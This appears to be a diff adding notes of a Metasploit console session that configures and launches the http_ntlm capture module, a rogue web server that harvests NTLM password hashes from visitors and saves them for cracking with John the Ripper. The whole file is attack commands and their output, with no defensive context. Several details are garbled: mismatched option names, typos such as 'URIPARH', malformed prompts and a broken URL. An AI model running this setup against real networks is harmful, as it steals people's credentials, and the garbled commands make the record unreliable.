@@ -1,0 +1,18 @@
+msf > use auxiliary/server/capture/http_ntlm
+---
+msf auxiliary(http_ntlm) > set srvhost [IP]                                OUTPUT            SRVhost =>  [IP ENTERED]
+---
+msf auxiliary(http_ntlm) > set SVRPORT 80                                  OUTPUT            SRVPORT => 80
+---
+msf = auxiliary(http_ntlm) > set URIPATH /                                 OUTPUT            URIPARH => /
+---
+msf auxiliary(http_ntlm) set JOHNPWFILE /root/Desktop/                     OUTPUT            JOHNPWPATH => /root/Desktop/
+---
+msf auxiliary(http_ntlm) > exploit
+---
+[*] Auxiliary module running as background job 0.
+
+msf auxiliary(http_ntlm) >
+---
+[*] Using URL: http://[IP:80/]
+[*] Server started
